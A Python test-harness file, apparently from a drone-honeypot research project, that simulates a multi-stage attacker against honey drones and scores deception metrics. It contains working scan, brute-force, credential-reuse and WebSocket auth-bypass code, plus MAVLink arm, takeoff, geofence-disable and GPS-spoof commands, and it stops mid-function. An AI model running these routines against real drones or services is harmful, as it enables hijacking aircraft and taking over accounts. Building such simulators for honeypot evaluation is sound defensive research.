#!/usr/bin/env python3
"""
attacker_sim.py — Adaptive Multi-Stage Attacker Simulator (L0-L4)

Project  : MIRAGE-UAS
Module   : Test Harness / Attacker Simulator
Author   : DS Lab / 민성 <kmseong0508@kyonggi.ac.kr>
Created  : 2026-04-06
Version  : 0.2.0

[Inputs]
    - ATTACKER_LEVEL_DURATION_SEC   (env, default 60s)
    - HONEY_DRONE_TARGETS           (env, comma-separated IP:PORT)

[Outputs]
    - /results/attacker_log.jsonl   (full interaction log)
    - stdout: final DeceptionScore

[DATA FLOW]
    L0: nmap-style SYN probing + banner grabbing + service fingerprinting
    L1: MAVLink protocol exploitation (HEARTBEAT → PARAM → ARM → TAKEOFF)
    L2: HTTP API enumeration + credential brute-force + credential reuse
    L3: WebSocket CVE-2026-25253 + RTSP DoS + breadcrumb extraction
    L4: APT — credential reuse, lateral movement, GPS spoof, persistence

[DESIGN]
    ① Adaptive: each level uses intelligence gathered from previous levels
    ② Realistic timing: human-like delays with jitter, no instant scanning
    ③ Response-driven: decisions change based on what the target returns
    ④ Lateral movement: cross-drone exploitation using harvested creds
    ⑤ ATT&CK mapped: every action references MITRE ATT&CK for ICS TTP
"""

from __future__ import annotations

import asyncio
import json
import os
import random
import socket
import struct
import time
from pathlib import Path
from typing import Optional

# ── Configuration ────────────────────────────────────────────────────────────
_LEVEL_DURATION_SEC = int(os.environ.get("ATTACKER_LEVEL_DURATION_SEC", "60"))
_TARGETS_RAW = os.environ.get(
    "HONEY_DRONE_TARGETS",
    "172.40.0.10:14551,172.40.0.11:14552,172.40.0.12:14553",
)
_LOG_PATH = Path(os.environ.get("RESULTS_DIR", "/results")) / "attacker_log.jsonl"
_WS_PORT_BASE = int(os.environ.get("WEBCLAW_PORT_BASE", "18789"))
_HTTP_PORT_BASE = int(os.environ.get("HTTP_PORT_BASE", "8080"))

# Parse targets: "ip:port" → list[(ip, port)]
_TARGETS: list[tuple[str, int]] = []
for _t in _TARGETS_RAW.split(","):
    _t = _t.strip()
    if ":" in _t:
        _ip, _port = _t.rsplit(":", 1)
        _TARGETS.append((_ip.strip(), int(_port.strip())))


# ── Shared Intelligence Store ────────────────────────────────────────────────
# Accumulated across levels — each level enriches this for the next

class IntelStore:
    """Cross-level intelligence gathered during the attack campaign."""

    def __init__(self) -> None:
        # L0 discoveries
        self.open_ports: dict[str, list[int]] = {}          # ip → [open ports]
        self.service_banners: dict[str, dict[int, str]] = {}  # ip → {port: banner}

        # L1 discoveries
        self.mavlink_alive: set[str] = set()                # IPs that responded to MAVLink
        self.drone_sysids: dict[str, int] = {}              # ip → sysid from HEARTBEAT
        self.param_values: dict[str, dict[str, float]] = {} # ip → {param: value}
        self.arm_accepted: set[str] = set()                 # IPs that accepted ARM

        # L2 discoveries
        self.api_tokens: dict[str, str] = {}                # ip → api_token
        self.signing_keys: dict[str, str] = {}              # ip → signing_key
        self.ssh_passwords: dict[str, str] = {}             # ip → ssh_password
        self.backup_gcs: dict[str, str] = {}                # ip → backup GCS address
        self.config_endpoints: dict[str, str] = {}          # ip → config endpoint URL
        self.upload_endpoints: dict[str, str] = {}          # ip → upload endpoint URL
        self.fleet_c2: Optional[str] = None                 # fleet C2 address
        self.credentials_found: list[tuple[str, str]] = []  # (user, pass) pairs
        self.mission_keys: dict[str, str] = {}              # ip → mission_key
        self.login_tokens: dict[str, str] = {}              # ip → login token

        # L3 discoveries
        self.ws_permissions: dict[str, list[str]] = {}      # ip → [permissions]
        self.ws_key_fragments: dict[str, str] = {}          # ip → signing_key_fragment
        self.breadcrumb_urls: list[str] = []                # discovered lure URLs
        self.rtsp_vulnerable: set[str] = set()              # IPs with RTSP responding

        # L4 enrichment
        self.ghost_services: dict[str, list[int]] = {}      # ip → [ghost ports]
        self.lateral_targets: list[str] = []                # IPs discovered via breadcrumbs

    def summary(self) -> dict:
        return {
            "open_ports": sum(len(v) for v in self.open_ports.values()),
            "mavlink_alive": len(self.mavlink_alive),
            "api_tokens": len(self.api_tokens),
            "signing_keys": len(self.signing_keys),
            "ssh_passwords": len(self.ssh_passwords),
            "credentials": len(self.credentials_found),
            "breadcrumb_urls": len(self.breadcrumb_urls),
            "ghost_services": sum(len(v) for v in self.ghost_services.values()),
        }


_intel = IntelStore()


# ── HoneyGPT Deception Counters (per-level session metrics) ─────────────────
# SALC:  attack succeeded + logically correct response (honeypot fooled attacker)
# SALNLC: attack succeeded + logically incorrect response (bad honeypot fidelity)
# FALC:  attack failed + logically correct response (attacker lured deeper)
# evasion: fingerprinting / timing probes that indicate honeypot detection attempt

class _DeceptionCounters:
    """Track HoneyGPT-style deception metrics across the campaign."""

    def __init__(self) -> None:
        self.salc: int = 0
        self.salnlc: int = 0
        self.falc: int = 0
        self.evasion_cmds: int = 0
        self.total_cmds: int = 0

    def classify(self, action: str, response: str, duration_ms: float) -> None:
        """Classify each logged interaction into SALC/SALNLC/FALC/evasion."""
        # Skip meta-actions (summaries, campaign_complete)
        if action in ("recon_summary", "intel_summary", "campaign_complete"):
            return

        self.total_cmds += 1

        # Evasion-class commands: unusual probing, timing analysis, null-byte
        _evasion_patterns = (
            "null_byte", "timing_probe", "fingerprint", "version_check",
            "unusual_probe", "scan_closed", "probe_timeout",
        )
        if any(p in action for p in _evasion_patterns):
            self.evasion_cmds += 1

        # Classify by action outcome
        got_response = bool(response) and duration_ms > 0
        is_timeout = "timeout" in action or "fail" in action or "closed" in action

        # Actions indicating command accepted (valid response + success)
        _accepted_patterns = (
            "accepted", "login_success", "auth_bypass", "ssh_login",
            "gps_spoof", "fence_disabled", "file_transfer", "credential_reuse",
            "lateral_ssh", "lateral_api", "ghost_auth",
        )
        # Actions indicating valid response but command rejected/blocked
        _rejected_valid_patterns = (
            "scan_open", "mavlink_probe", "http_get_", "ws_connect",
            "rtsp_options", "breadcrumb_follow", "ghost_probe",
            "authenticated_request", "follow_endpoint",
        )

        if is_timeout:
            # No response — doesn't count for HoneyGPT metrics
            pass
        elif any(p in action for p in _accepted_patterns):
            if got_response:
                self.salc += 1      # Succeeded + valid response
            else:
                self.salnlc += 1    # Succeeded but response was invalid
        elif any(p in action for p in _rejected_valid_patterns):
            if got_response:
                self.falc += 1      # Valid response but command didn't achieve goal
        elif got_response:
            # Other actions with a response — default to SALC
            self.salc += 1
        else:
            self.salnlc += 1

    @property
    def honeypot_detected(self) -> bool:
        """True if attacker issued >15% evasion-class commands."""
        if self.total_cmds == 0:
            return False
        return self.evasion_cmds > (self.total_cmds * 0.15)

    def to_dict(self) -> dict:
        return {
            "salc": self.salc,
            "salnlc": self.salnlc,
            "falc": self.falc,
            "evasion_cmds": self.evasion_cmds,
            "total_cmds": self.total_cmds,
            "honeypot_detected": self.honeypot_detected,
        }


_counters = _DeceptionCounters()

# ── Optional LLM attacker belief tracker (opt-in via env) ─────────────────────
# Enable with: ATTACKER_LLM_BELIEF_ENABLED=1
#              ATTACKER_LLM_BELIEF_MODEL=llama3.1:8b
#              ATTACKER_LLM_BELIEF_OLLAMA_URL=http://172.23.240.1:11434
_BELIEF_TRACKER = None
try:
    import sys as _sys
    _sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
    from honey_drone.attacker_belief_tracker import build_from_env as _build_belief
    _BELIEF_TRACKER = _build_belief()
    if _BELIEF_TRACKER is not None:
        print(f"  Attacker belief tracker ENABLED — model={_BELIEF_TRACKER._model}")
except Exception as _e:
    print(f"  Attacker belief tracker import failed: {_e}")


# ── Logging ──────────────────────────────────────────────────────────────────

def _log(level: int, action: str, target: str, response: str,
         duration_ms: float, ttp: str = "", intel_gained: str = "") -> None:
    record = {
        "timestamp": time.time(),
        "level": level,
        "action": action,
        "target": target,
        "response_preview": response[:200],
        "duration_ms": round(duration_ms, 2),
    }
    if ttp:
        record["mitre_ttp"] = ttp
    if intel_gained:
        record["intel_gained"] = intel_gained

    # Classify for HoneyGPT deception metrics
    if level >= 0:
        _counters.classify(action, response, duration_ms)

    # Optional: LLM-based attacker belief tracker — schedules an async
    # observation task. Belief is appended to the same JSONL file under
    # `attacker_belief` field via the tracker's `history` entries at end
    # of run.
    if _BELIEF_TRACKER is not None and response:
        try:
            intel_snapshot = {
                "tokens": len(_intel.api_tokens),
                "creds": len(_intel.credentials_found),
                "ssh_pw": len(_intel.ssh_passwords),
                "breadcrumbs": len(_intel.breadcrumb_urls),
            }
            # Fire-and-forget — do not block the main scripted loop on
            # the belief LLM call. Output aggregated at run-end.
            asyncio.get_event_loop().create_task(
                _BELIEF_TRACKER.observe(action, response, intel_snapshot),
            )
        except Exception:
            pass  # never break the attacker run on tracker failure

    _LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
    with open(_LOG_PATH, "a") as f:
        f.write(json.dumps(record, ensure_ascii=False) + "\n")


# ── Human-like timing ────────────────────────────────────────────────────────

async def _human_delay(base_sec: float = 0.3, jitter: float = 0.2) -> None:
    """Simulate human-like inter-action delay with random jitter."""
    await asyncio.sleep(base_sec + random.uniform(0, jitter))


async def _think_delay() -> None:
    """Simulate attacker pausing to analyze results (1-3 seconds)."""
    await asyncio.sleep(random.uniform(1.0, 3.0))


# ── MAVLink Packet Builders ──────────────────────────────────────────────────

def _build_heartbeat_bytes() -> bytes:
    """MAVLink v2 HEARTBEAT from GCS (type=6, autopilot=8)."""
    payload = struct.pack("<BBBBBB",
        6,   # MAV_TYPE_GCS
        8,   # MAV_AUTOPILOT_INVALID
        0,   # base_mode
        0, 0, 0,
    ) + struct.pack("<BB", 0, 3)
    return payload


def _build_param_request_list() -> bytes:
    return struct.pack("<BB", 1, 1)


def _build_param_request_read(param_id: str) -> bytes:
    """PARAM_REQUEST_READ for a specific parameter name."""
    name_b = param_id.encode("ascii")[:16].ljust(16, b"\x00")
    return struct.pack("<BB", 1, 1) + name_b + struct.pack("<h", -1)


def _build_arm_command() -> bytes:
    """COMMAND_LONG: MAV_CMD_COMPONENT_ARM_DISARM (400) with param1=1.0 (arm)."""
    return struct.pack("<H", 400) + struct.pack("<f", 1.0) + b"\x00" * 24


def _build_takeoff_command(alt: float = 50.0) -> bytes:
    """COMMAND_LONG: MAV_CMD_NAV_TAKEOFF (22) with target altitude."""
    return (struct.pack("<H", 22) +
            struct.pack("<f", 0.0) * 3 +  # param1-3
            struct.pack("<f", 0.0) +       # param4 (yaw)
            struct.pack("<f", 0.0) * 2 +   # param5-6 (lat, lon)
            struct.pack("<f", alt))         # param7 (alt)


def _build_set_mode(mode: int = 4) -> bytes:
    """SET_MODE: custom_mode=4 (GUIDED)."""
    return struct.pack("<BBI", 1, 0, mode)


def _build_request_data_stream() -> bytes:
    """REQUEST_DATA_STREAM: all streams at 4Hz."""
    return struct.pack("<BBHB", 1, 1, 4, 1)  # sysid, compid, rate, start


def _build_mission_request_list() -> bytes:
    return struct.pack("<BB", 1, 1)


def _build_gps_inject(lat: float = 37.5500, lon: float = 127.0000) -> bytes:
    """GPS_INJECT_DATA: fake GPS coordinates."""
    lat_i = int(lat * 1e7)
    lon_i = int(lon * 1e7)
    return (struct.pack("<BBB", 1, 1, 16) +
            struct.pack("<ii", lat_i, lon_i) +
            b"\x00" * 8)


def _build_param_set(param_id: str, value: float) -> bytes:
    """PARAM_SET: write a parameter value."""
    name_b = param_id.encode("ascii")[:16].ljust(16, b"\x00")
    return struct.pack("<BB", 1, 1) + name_b + struct.pack("<fB", value, 9)


def _build_file_transfer() -> bytes:
    """FILE_TRANSFER_PROTOCOL: request file listing."""
    return struct.pack("<BBB", 1, 1, 0) + b"\x00" * 32


# ── L0: Realistic Reconnaissance ────────────────────────────────────────────
# T0846: Remote System Discovery
# T0842: Network Sniffing (passive + active)

async def run_l0(duration_sec: int) -> float:
    """
    L0: nmap-style service discovery + banner grabbing.

    Behavior:
    - TCP SYN-like connect scan on known drone service ports
    - UDP probe on MAVLink port range
    - Banner grab on responding services
    - Service version fingerprinting from responses
    """
    start = time.time()
    decoy_time = 0.0

    # Realistic port list: what an attacker scanning for drones would check
    TCP_PORTS = [80, 443, 2222, 5760, 8080, 8443, 8554, 8765, 9000,
                 18789, 18790, 18791, 19000, 19001, 19002, 19003, 19004,
                 19005, 19006, 19007, 19008, 19009, 19010, 19042]
    UDP_PORTS = list(range(14550, 14565))

    print(f"  [L0] Phase 1: TCP service scan ({len(TCP_PORTS)} ports x {len(_TARGETS)} hosts)")

    for ip, _ in _TARGETS:
        _intel.open_ports.setdefault(ip, [])
        _intel.service_banners.setdefault(ip, {})

        # ── TCP connect scan with banner grab ──
        for port in TCP_PORTS:
            if time.time() - start >= duration_sec:
                break

            target = f"{ip}:{port}"
            t0 = time.time()
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port), timeout=1.5
                )
                elapsed = (time.time() - t0) * 1000
                decoy_time += elapsed / 1000

                _intel.open_ports[ip].append(port)

                # Banner grab: read first response
                banner = ""
                try:
                    # Send protocol-appropriate probe
                    if port == 8554:
                        writer.write(f"OPTIONS rtsp://{ip}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
                    elif port in (80, 8080, 8443, 8765, 19042):
                        writer.write(f"GET / HTTP/1.0\r\nHost: {ip}\r\n\r\n".encode())
                    elif port == 18789:
                        # Don't send WS handshake yet — just probe
                        writer.write(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
                    else:
                        pass  # some services send banner on connect

                    await writer.drain()
                    data = await asyncio.wait_for(reader.read(1024), timeout=1.0)
                    banner = data.decode(errors="ignore")[:120]
                except (asyncio.TimeoutError, ConnectionError):
                    pass

                _intel.service_banners[ip][port] = banner
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass

                svc_type = _identify_service(port, banner)
                _log(0, "tcp_scan_open", target, f"service={svc_type} banner={banner[:60]}",
                     elapsed, ttp="T0846", intel_gained=f"open:{port}={svc_type}")

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                _log(0, "tcp_scan_closed", target, "", (time.time() - t0) * 1000, ttp="T0846")

            # nmap-like timing: slight random delay between probes
            await asyncio.sleep(random.uniform(0.02, 0.08))

    print(f"  [L0] Phase 2: UDP MAVLink probe ({len(UDP_PORTS)} ports)")

    # ── UDP MAVLink probe ──
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1.5)

    for ip, _ in _TARGETS:
        for port in UDP_PORTS:
            if time.time() - start >= duration_sec:
                break

            target = f"{ip}:{port}"
            # Send a valid MAVLink HEARTBEAT (not random bytes)
            payload = _build_heartbeat_bytes()
            t0 = time.time()
            try:
                sock.sendto(payload, (ip, port))
                data, _ = sock.recvfrom(2048)
                elapsed = (time.time() - t0) * 1000
                decoy_time += elapsed / 1000

                _intel.open_ports[ip].append(port)
                _intel.mavlink_alive.add(ip)

                # Parse response for sysid
                if len(data) >= 8:
                    _intel.service_banners[ip][port] = f"mavlink_resp:{data.hex()[:32]}"

                _log(0, "udp_mavlink_probe", target, data.hex()[:64], elapsed,
                     ttp="T0846", intel_gained=f"mavlink_alive:{ip}")

            except socket.timeout:
                _log(0, "udp_probe_timeout", target, "", 1500.0, ttp="T0846")
            except OSError:
                pass

            await asyncio.sleep(random.uniform(0.05, 0.15))

    sock.close()

    # ── Analyze and report findings ──
    total_open = sum(len(v) for v in _intel.open_ports.values())
    print(f"  [L0] Scan complete: {total_open} open ports across {len(_TARGETS)} targets")
    _log(0, "recon_summary", "all", json.dumps(_intel.summary()), 0,
         ttp="T0846", intel_gained=f"total_open_ports={total_open}")

    return decoy_time


def _identify_service(port: int, banner: str) -> str:
    """Identify service from port number and banner content."""
    if "RTSP" in banner:
        return "rtsp-camera"
    if "HTTP" in banner or "html" in banner.lower():
        return "http-api"
    if "websocket" in banner.lower() or "openclaw" in banner.lower():
        return "openclaw-ws"
    if "ghost_telemetry" in banner or "ArduCopter" in banner:
        return "ghost-telemetry"
    if "SSH" in banner:
        return "ssh"
    port_map = {
        80: "http", 443: "https", 2222: "ssh", 5760: "sitl-mavlink",
        8554: "rtsp", 18789: "openclaw-ws", 8080: "http-alt",
    }
    if port in port_map:
        return port_map[port]
    if 19000 <= port <= 19020:
        return "ghost-service"
    if 14550 <= port <= 14570:
        return "mavlink-udp"
    return "unknown"


# ── L1: MAVLink Protocol Exploitation ────────────────────────────────────────
# T0830: Manipulation of Control
# T0855: Unauthorized Command Message
# T0836: Modify Parameter

async def run_l1(duration_sec: int) -> float:
    """
    L1: Systematic MAVLink exploitation using L0 intelligence.

    Behavior progression (mimics mavproxy/dronekit operator):
    1. HEARTBEAT → establish presence
    2. REQUEST_DATA_STREAM → request telemetry
    3. PARAM_REQUEST_LIST → enumerate parameters
    4. PARAM_REQUEST_READ → read specific high-value params
    5. SET_MODE GUIDED → attempt mode change
    6. ARM → attempt arm
    7. If ARM accepted: TAKEOFF → attempt takeoff
    8. MISSION_REQUEST_LIST → enumerate mission
    """
    start = time.time()
    decoy_time = 0.0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    # Use L0 intel: only target confirmed MAVLink hosts
    alive_targets = [(ip, port) for ip, port in _TARGETS if ip in _intel.mavlink_alive]
    if not alive_targets:
        alive_targets = _TARGETS  # fallback if L0 didn't run

    print(f"  [L1] Targeting {len(alive_targets)} MAVLink hosts")

    cycle = 0
    while time.time() - start < duration_sec:
        for ip, port in alive_targets:
            if time.time() - start >= duration_sec:
                break

            target = f"{ip}:{port}"
            _intel.param_values.setdefault(ip, {})

            # ── Step 1: HEARTBEAT handshake (like mavproxy connect) ──
            resp = await _mavlink_send(sock, ip, port, _build_heartbeat_bytes(), "heartbeat", 1)
            if resp:
                _intel.mavlink_alive.add(ip)
                # Try to extract sysid from response
                if len(resp) >= 6:
                    try:
                        # Crude sysid extraction from heartbeat response
                        _intel.drone_sysids[ip] = resp[5] if len(resp) > 5 else 1
                    except (IndexError, TypeError):
                        pass
                decoy_time += 0.1

            await _human_delay(0.8, 0.4)  # mavproxy waits ~1s between init steps

            # ── Step 2: REQUEST_DATA_STREAM ──
            resp = await _mavlink_send(sock, ip, port, _build_request_data_stream(),
                                       "request_data_stream", 1)
            if resp:
                decoy_time += 0.1
            await _human_delay(0.5, 0.3)

            # ── Step 3: PARAM_REQUEST_LIST (full dump) ──
            resp = await _mavlink_send(sock, ip, port, _build_param_request_list(),
                                       "param_request_list", 1)
            if resp:
                decoy_time += 0.1
                _parse_param_response(ip, resp)
            await _human_delay(0.5, 0.3)

            # ── Step 4: Read high-value params individually ──
            high_value_params = ["SYSID_MYGCS", "FENCE_ENABLE", "BATT_CAPACITY",
                                 "WPNAV_SPEED", "FS_BATT_ENABLE"]
            for param in high_value_params[:3]:
                resp = await _mavlink_send(sock, ip, port,
                                           _build_param_request_read(param),
                                           f"param_read_{param}", 1)
                if resp:
                    _parse_param_response(ip, resp)
                    decoy_time += 0.05
                await _human_delay(0.3, 0.1)

            # ── Step 5: SET_MODE GUIDED ──
            resp = await _mavlink_send(sock, ip, port, _build_set_mode(4),
                                       "set_mode_guided", 1)
            if resp:
                decoy_time += 0.1
                _log(1, "set_mode_accepted", target, resp.hex()[:32], 0,
                     ttp="T0855", intel_gained="mode_change_accepted")
            await _human_delay(1.0, 0.5)

            # ── Step 6: ARM command ──
            resp = await _mavlink_send(sock, ip, port, _build_arm_command(),
                                       "arm_command", 1)
            if resp:
                decoy_time += 0.1
                _intel.arm_accepted.add(ip)
                _log(1, "arm_accepted", target, resp.hex()[:32], 0,
                     ttp="T0855", intel_gained=f"arm_accepted:{ip}")

                # ── Step 7: TAKEOFF (only if ARM succeeded) ──
                await _human_delay(1.5, 0.5)
                resp = await _mavlink_send(sock, ip, port,
                                           _build_takeoff_command(50.0),
                                           "takeoff_command", 1)
                if resp:
                    decoy_time += 0.2
                    _log(1, "takeoff_accepted", target, resp.hex()[:32], 0,
                         ttp="T0830", intel_gained="takeoff_command_accepted")

            await _human_delay(0.5, 0.3)

            # ── Step 8: MISSION_REQUEST_LIST ──
            resp = await _mavlink_send(sock, ip, port,
                                       _build_mission_request_list(),
                                       "mission_request_list", 1)
            if resp:
                decoy_time += 0.1
            await _think_delay()

        cycle += 1
        if cycle >= 3:
            # After 3 full cycles, also try PARAM_SET to test write access
            for ip, port in alive_targets[:1]:
                resp = await _mavlink_send(sock, ip, port,
                                           _build_param_set("FENCE_ENABLE", 0.0),
                                           "param_set_fence_disable", 1)
                if resp:
                    _log(1, "param_write_accepted", f"{ip}:{port}", resp.hex()[:32], 0,
                         ttp="T0836", intel_gained="param_write_possible")

    sock.close()
    return decoy_time


async def _mavlink_send(sock: socket.socket, ip: str, port: int,
                        payload: bytes, action: str, level: int) -> Optional[bytes]:
    """Send MAVLink payload and receive response. Returns response bytes or None."""
    target = f"{ip}:{port}"
    t0 = time.time()
    try:
        sock.sendto(payload, (ip, port))
        data, _ = sock.recvfrom(2048)
        elapsed = (time.time() - t0) * 1000
        _log(level, action, target, data.hex()[:64], elapsed, ttp="T0855")
        return data
    except socket.timeout:
        _log(level, f"{action}_timeout", target, "", 2000.0)
        return None
    except OSError:
        return None


def _parse_param_response(ip: str, data: bytes) -> None:
    """Extract parameter name/value from PARAM_VALUE response bytes."""
    try:
        if len(data) >= 25:
            value = struct.unpack_from("<f", data, 0)[0]
            name_bytes = data[4:20]
            name = name_bytes.split(b"\x00")[0].decode("ascii", errors="ignore")
            if name:
                _intel.param_values.setdefault(ip, {})[name] = value
    except (struct.error, ValueError):
        pass


# ── L2: HTTP API Enumeration + Credential Reuse ─────────────────────────────
# T0866: Exploitation of Remote Services
# T0859: Valid Accounts

async def run_l2(duration_sec: int) -> float:
    """
    L2: HTTP API enumeration with intelligent credential extraction.

    Adaptive behavior:
    1. Enumerate all HTTP endpoints discovered in L0
    2. Extract credentials, tokens, keys from API responses
    3. Try default credentials on login endpoint
    4. Reuse discovered credentials across drones (lateral)
    5. Follow config/upload endpoints mentioned in responses
    """
    import aiohttp

    start = time.time()
    decoy_time = 0.0

    # Build target list from L0 intel.
    # Host-published HTTP port = _HTTP_PORT_BASE + 1 + idx (compose maps
    # 8081/8082/8083 to container's 8080). Port 80 was never actually
    # published so the prior hard-coded 80 meant HTTP attacks silently
    # hit nothing.
    http_targets: list[tuple[str, int]] = []
    for idx, (ip, _) in enumerate(_TARGETS):
        http_port = _HTTP_PORT_BASE + 1 + idx if _HTTP_PORT_BASE == 8080 else _HTTP_PORT_BASE + idx
        http_targets.append((ip, http_port))

    # Phased endpoint enumeration
    recon_paths = ["/health", "/api/v1/params", "/api/v1/status", "/api/v1/mission"]
    extended_paths = ["/admin", "/api/v1/arm", "/robots.txt", "/.env",
                      "/api/v1/config", "/api/v1/firmware", "/api/v1/logs"]

    # Credential lists — including commonly found in drone companion computers
    default_creds = [
        ("admin", "admin"), ("root", "root"), ("operator", "password"),
        ("admin", "password"), ("pi", "raspberry"), ("drone", "drone"),
        ("admin", "dr0ne@dm1n2026"),  # from breadcrumb — if already found
    ]

    async with aiohttp.ClientSession() as session:
        while time.time() - start < duration_sec:
            for ip, http_port in http_targets:
                if time.time() - start >= duration_sec:
                    break

                base_url = f"http://{ip}:{http_port}"

                # ── Phase 1: Recon endpoints ──
                for path in recon_paths:
                    body = await _http_get(session, 2, ip, http_port, path)
                    if body:
                        decoy_time += 0.1
                        _extract_intel_from_http(ip, path, body)
                    await _human_delay(0.3, 0.2)

                # ── Phase 2: Default credential brute-force ──
                for user, passwd in default_creds:
                    body = await _http_post_login(session, ip, http_port, user, passwd)
                    if body:
                        decoy_time += 0.1
                        try:
                            data = json.loads(body)
                            if data.get("authenticated"):
                                _intel.credentials_found.append((user, passwd))
                                token = data.get("token", "")
                                if token:
                                    _intel.login_tokens[ip] = token
                                _log(2, "login_success", f"{base_url}/login",
                                     f"user={user} token={token[:20]}", 0,
                                     ttp="T0859",
                                     intel_gained=f"valid_creds:{user}:{passwd}")
                        except (json.JSONDecodeError, AttributeError):
                            pass
                    await _human_delay(0.5, 0.3)

                await _think_delay()

                # ── Phase 3: Extended enumeration ──
                for path in extended_paths:
                    body = await _http_get(session, 2, ip, http_port, path)
                    if body:
                        decoy_time += 0.05
                        _extract_intel_from_http(ip, path, body)
                    await _human_delay(0.2, 0.1)

                # ── Phase 4: Use discovered tokens for authenticated requests ──
                token = _intel.api_tokens.get(ip, _intel.login_tokens.get(ip, ""))
                if token:
                    for path in ["/api/v1/params", "/api/v1/mission"]:
                        headers = {"Authorization": f"Bearer {token}"}
                        body = await _http_get(session, 2, ip, http_port, path, headers)
                        if body:
                            decoy_time += 0.05
                            _log(2, "authenticated_request", f"{base_url}{path}",
                                 body[:80], 0, ttp="T0859",
                                 intel_gained="auth_api_access")
                        await _human_delay(0.3, 0.1)

                # ── Phase 5: Follow discovered config/upload endpoints ──
                for endpoint_url in [
                    _intel.config_endpoints.get(ip, ""),
                    _intel.upload_endpoints.get(ip, ""),
                ]:
                    if not endpoint_url:
                        continue
                    t0 = time.time()
                    try:
                        async with session.get(
                            endpoint_url, timeout=aiohttp.ClientTimeout(total=3)
                        ) as resp:
                            body = await resp.text()
                            elapsed = (time.time() - t0) * 1000
                            decoy_time += elapsed / 1000
                            _log(2, "follow_endpoint", endpoint_url, body[:80], elapsed,
                                 ttp="T0866", intel_gained="endpoint_data")
                    except Exception:
                        pass
                    await _human_delay(0.3, 0.1)

                # ── Phase 6: Credential reuse — try creds from drone A on drone B ──
                if _intel.ssh_passwords and len(http_targets) > 1:
                    for other_ip, other_port in http_targets:
                        if other_ip == ip:
                            continue
                        for found_user, found_pass in _intel.credentials_found[:3]:
                            body = await _http_post_login(
                                session, other_ip, other_port, found_user, found_pass
                            )
                            if body:
                                _log(2, "credential_reuse", f"http://{other_ip}:{other_port}/login",
                                     body[:60], 0, ttp="T0859",
                                     intel_gained=f"lateral_cred_reuse:{other_ip}")
                            await _human_delay(0.5, 0.2)

    print(f"  [L2] Intel: {len(_intel.api_tokens)} tokens, "
          f"{len(_intel.signing_keys)} keys, "
          f"{len(_intel.credentials_found)} creds")
    return decoy_time


async def _http_get(session, level: int, ip: str, port: int, path: str,
                    headers: Optional[dict] = None) -> Optional[str]:
    """HTTP GET with logging. Returns body text or None."""
    url = f"http://{ip}:{port}{path}"
    t0 = time.time()
    try:
        async with session.get(
            url, timeout=__import__("aiohttp").ClientTimeout(total=3),
            headers=headers,
        ) as resp:
            body = await resp.text()
            elapsed = (time.time() - t0) * 1000
            _log(level, f"http_get_{path}", url, body[:100], elapsed, ttp="T0866")
            return body
    except Exception as e:
        _log(level, f"http_get_{path}_fail", url, str(e)[:60], 0)
        return None


async def _http_post_login(session, ip: str, port: int,
                           user: str, passwd: str) -> Optional[str]:
    """HTTP POST login attempt. Returns body text or None."""
    url = f"http://{ip}:{port}/login"
    t0 = time.time()
    try:
        async with session.post(
            url,
            json={"username": user, "password": passwd},
            timeout=__import__("aiohttp").ClientTimeout(total=3),
        ) as resp:
            body = await resp.text()
            elapsed = (time.time() - t0) * 1000
            _log(2, "http_login", url, f"user={user} resp={body[:60]}", elapsed, ttp="T0859")
            return body
    except Exception:
        return None


def _extract_intel_from_http(ip: str, path: str, body: str) -> None:
    """Parse HTTP response body and extract any intelligence."""
    try:
        data = json.loads(body)
    except (json.JSONDecodeError, ValueError):
        return

    # API tokens
    for key in ("api_token", "token"):
        val = data.get(key, "")
        if val and isinstance(val, str) and len(val) > 8:
            _intel.api_tokens[ip] = val

    # Signing keys
    for key in ("signing_key", "signing_key_fragment"):
        val = data.get(key, "")
        if val and isinstance(val, str):
            _intel.signing_keys[ip] = val

    # SSH password
    val = data.get("ssh_password", "")
    if val:
        _intel.ssh_passwords[ip] = val

    # Backup GCS
    val = data.get("backup_gcs", "")
    if val:
        _intel.backup_gcs[ip] = val

    # Config/upload endpoints
    val = data.get("config_endpoint", "")
    if val:
        _intel.config_endpoints[ip] = val
    val = data.get("upload_endpoint", "")
    if val:
        _intel.upload_endpoints[ip] = val

    # Fleet C2
    val = data.get("fleet_c2", "")
    if val:
        _intel.fleet_c2 = val

    # Mission key
    val = data.get("mission_key", "")
    if val:
        _intel.mission_keys[ip] = val


# ── L3: WebSocket Exploit + RTSP DoS + Breadcrumb Chain ─────────────────────
# T0866: Exploitation of Remote Services
# T0813: Denial of Control
# T0815: Denial of View

async def run_l3(duration_sec: int) -> float:
    """
    L3: Advanced protocol exploitation using all gathered intelligence.

    Adaptive behavior:
    1. WebSocket CVE-2026-25253 auth bypass with credential chaining
    2. Extract deep breadcrumbs (signing keys, skill permissions)
    3. Invoke skills with harvested tokens
    4. RTSP camera stream disruption (TEARDOWN, PAUSE, PLAY with spoofed session)
    5. Follow all discovered breadcrumb URLs
    """
    import websockets

    start = time.time()
    decoy_time = 0.0

    while time.time() - start < duration_sec:
        for idx, (ip, _) in enumerate(_TARGETS):
            if time.time() - start >= duration_sec:
                break

            # ── WebSocket exploitation ──
            # Host-published WS port = _WS_PORT_BASE + idx so each honey
            # in the fleet gets hit (Docker compose maps 18789->01, 18790->02,
            # 18791->03). Previously this was hardcoded to 18789 and only
            # honey_01 ever received attack traffic.
            ws_port = _WS_PORT_BASE + idx
            ws_url = f"ws://{ip}:{ws_port}"
            t0 = time.time()

            try:
                async with websockets.connect(
                    ws_url,
                    additional_headers={"Origin": "null"},  # CVE-2026-25253
                    open_timeout=3,
                ) as ws:
                    # Step 1: Auth bypass
                    await ws.send(json.dumps({"type": "auth", "token": ""}))
                    resp = await asyncio.wait_for(ws.recv(), timeout=3)
                    elapsed = (time.time() - t0) * 1000
                    decoy_time += elapsed / 1000

                    _log(3, "ws_cve_auth_bypass", ws_url, str(resp)[:100], elapsed,
                         ttp="T0866", intel_gained="ws_auth_bypassed")

                    # Parse auth response for intel
                    try:
                        auth_data = json.loads(resp)
